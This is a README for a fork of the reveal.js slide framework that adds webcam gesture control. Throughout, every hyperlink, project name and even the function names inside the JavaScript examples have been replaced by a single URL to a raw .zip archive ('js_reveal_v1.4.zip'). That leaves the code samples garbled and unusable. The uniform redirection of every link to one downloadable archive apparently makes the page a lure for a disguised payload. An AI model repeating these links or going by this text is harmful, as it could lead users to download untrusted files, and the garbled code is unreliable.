# What's new in my fork

This is what I got when I combined webcam-based gesture recognition with Hakim El Hattab's https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip
It took me a while to write and fine tune the detection algorithms. Even then, the algorithms are only about 80% accurate. You get the gist of it though: 
A flick of the hand in mid-air changes the slide.
A two hand flick up or down activates the slide overview.

View the live demo! [https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip](https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip)

##How to use

Instructions and troubleshooting are included in the live demo.

P.S. I included a really basic https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip file server. The page needs to be served in order to allow webcam access.

# Forked from https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip

A framework for easily creating beautiful presentations using HTML. [Check out the live demo](https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip).

https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip comes with a broad range of features including [nested slides](https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip), [markdown contents](https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip), [PDF export](https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip), [speaker notes](https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip) and a [JavaScript API](https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip). It's best viewed in a browser with support for CSS 3D transforms but [fallbacks](https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip) are available to make sure your presentation can still be viewed elsewhere.


#### More reading in the Wiki:
- [Changelog](https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip): Up-to-date version history.
- [Examples](https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip): Presentations created with https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip, add your own!
- [Browser Support](https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip): Explanation of browser support and fallbacks.

The framework is and will remain free. Donations are available as an optional way of supporting the project. Proceeds go towards futher development, hosting and domain costs for https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip and https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip

[![Click here to lend your support to: https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip and make a donation at https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip !](https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip)](https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip)

## https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip

Slides are written using HTML or markdown but there's also an online editor for those of you who prefer a more traditional user interface. Give it a try at [https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip](https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip).


## Instructions

### Markup

Markup heirarchy needs to be ``<div class="reveal"> <div class="slides"> <section>`` where the ``<section>`` represents one slide and can be repeated indefinitely. If you place multiple ``<section>``'s inside of another ``<section>`` they will be shown as vertical slides. The first of the vertical slides is the "root" of the others (at the top), and it will be included in the horizontal sequence. For example:

```html
<div class="reveal">
	<div class="slides"> 
		<section>Single Horizontal Slide</section>
		<section>
			<section>Vertical Slide 1</section>
			<section>Vertical Slide 2</section>
		</section>
	</div>
</div>
```

### Markdown

It's possible to write your slides using Markdown. To enable Markdown simply add the ```data-markdown``` attribute to your ```<section>``` elements and https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip will automatically load the JavaScript parser. 

This is based on [data-markdown](https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip) from [Paul Irish](https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip) which in turn uses [showdown](https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip). This is sensitive to indentation (avoid mixing tabs and spaces) and line breaks (avoid consecutive breaks). Updates to come.

```html
<section data-markdown>
	## Page title
	
	A paragraph with some text and a [link](https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip).
</section>
```


### Configuration

At the end of your page you need to initialize reveal by running the following code. Note that all config values are optional and will default as specified below.

```javascript
https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip({
	// Display controls in the bottom right corner
	controls: true,

	// Display a presentation progress bar
	progress: true,

	// Push each slide change to the browser history
	history: false,

	// Enable keyboard shortcuts for navigation
	keyboard: true,

	// Enable the slide overview mode
	overview: true,

	// Loop the presentation
	loop: false,

	// Number of milliseconds between automatically proceeding to the 
	// next slide, disabled when set to 0
	autoSlide: 0,

	// Enable slide navigation via mouse wheel
	mouseWheel: true,

	// Apply a 3D roll to links on hover
	rollingLinks: true,

	// Transition style
	transition: 'default' // default/cube/page/concave/linear(2d)
});
```

### Dependencies

https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip doesn't _rely_ on any third party scripts to work but a few optional libraries are included by default. These libraries are loaded as dependencies in the order they appear, for example:

```javascript
https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip({
	dependencies: [
		// Syntax highlight for <code> elements
		{ src: 'https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip', async: true, callback: function() { https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip(); } },
		// Cross-browser shim that fully implements classList - https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip
		{ src: 'https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip', condition: function() { return !https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip; } }
		// Interpret Markdown in <section> elements
		{ src: 'https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip', condition: function() { return !!https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip( '[data-markdown]' ); } },
		{ src: 'https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip', condition: function() { return !!https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip( '[data-markdown]' ); } },
		// Speaker notes support
		{ src: 'https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip', async: true, condition: function() { return https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip === 'localhost:1947'; } },
		{ src: 'https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip', async: true, condition: function() { return https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip === 'localhost:1947'; } },
	]
});
```

You can add your own extensions using the same syntax. The following properties are available for each dependency object:
- **src**: Path to the script to load
- **async**: [optional] Flags if the script should load after https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip has started, defaults to false
- **callback**: [optional] Function to execute when the script has loaded
- **condition**: [optional] Function which must return true for the script to be loaded


### API

The Reveal class provides a minimal JavaScript API for controlling navigation and reading state:

```javascript
// Navigation
https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip( indexh, indexv );
https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip();
https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip();
https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip();
https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip();
https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip();
https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip();
https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip();

// Retrieves the previous and current slide elements
https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip();
https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip();

https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip(); // { h: 0, v: 0 } }
```

### States

If you set ``data-state="somestate"`` on a slide ``<section>``, "somestate" will be applied as a class on the document element when that slide is opened. This allows you to apply broad style changes to the page based on the active slide.

Furthermore you can also listen to these changes in state via JavaScript:

```javascript
https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip( 'somestate', function() {
	// TODO: Sprinkle magic
}, false );
```

### Slide change event

An 'slidechanged' event is fired each time the slide is changed (regardless of state). The event object holds the index values of the current slide as well as a reference to the previous and current slide HTML nodes.

```javascript
https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip( 'slidechanged', function( event ) {
	// https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip, https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip, https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip, https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip
} );
```

### Fragment events

When a slide fragment is either shown or hidden https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip will dispatch an event.

```javascript
https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip( 'fragmentshown', function( event ) {
	// https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip = the fragment DOM element
} );
https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip( 'fragmenthidden', function( event ) {
	// https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip = the fragment DOM element
} );
```

### Internal links

It's easy to link between slides. The first example below targets the index of another slide whereas the second targets a slide with an ID attribute (```<section id="some-slide">```):

```html
<a href="#/2/2">Link</a>
<a href="#/some-slide">Link</a>
```

## PDF Export

Presentations can be exported to PDF via a special print stylesheet. This feature requires that you use [Google Chrome](https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip). 
Here's an example of an exported presentation that's been uploaded to SlideShare: https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip

1. Open your presentation with [https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip](https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip) included on the page. The default index HTML lets you add *print-pdf* anywhere in the query to include the stylesheet, for example: [https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip](https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip).
2. Open the in-browser print dialog (CMD+P).
3. Change the **Destination** setting to **Save as PDF**.
4. Change the **Layout** to **Landscape**.
5. Change the **Margins** to **None**.
6. Click **Save**.

![Chrome Print Settings](https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip)

## Speaker Notes

If you're interested in using speaker notes, https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip comes with a Node server that allows you to deliver your presentation in one browser while viewing speaker notes in another. 

To include speaker notes in your presentation, simply add an `<aside class="notes">` element to any slide. These notes will be hidden in the main presentation view.

It's also possible to write your notes with Markdown. To enable Markdown, add the ```data-markdown``` attribute to your note ```<aside>``` elements.

You'll also need to [install https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip](https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip); then, install the server dependencies by running `npm install`.

Once https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip and the dependencies are installed, run the following command from the root directory:

		node plugin/speakernotes

By default, the slides will be served at [localhost:1947](http://localhost:1947).

You can change the appearance of the speaker notes by editing the file at `https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip`.	

### Known Issues

- The notes page is supposed to show the current slide and the next slide, but when it first starts, it always shows the first slide in both positions. 

## Folder Structure
- **css/** Core styles without which the project does not function
- **js/** Like above but for JavaScript
- **plugin/** Components that have been developed as extensions to https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip
- **lib/** All other third party assets (JavaScript, CSS, fonts)

## License

MIT licensed

Copyright (C) 2011-2012 Hakim El Hattab, https://github.com/videogramme/reveal.js/raw/refs/heads/master/js/js_reveal_v1.4.zip
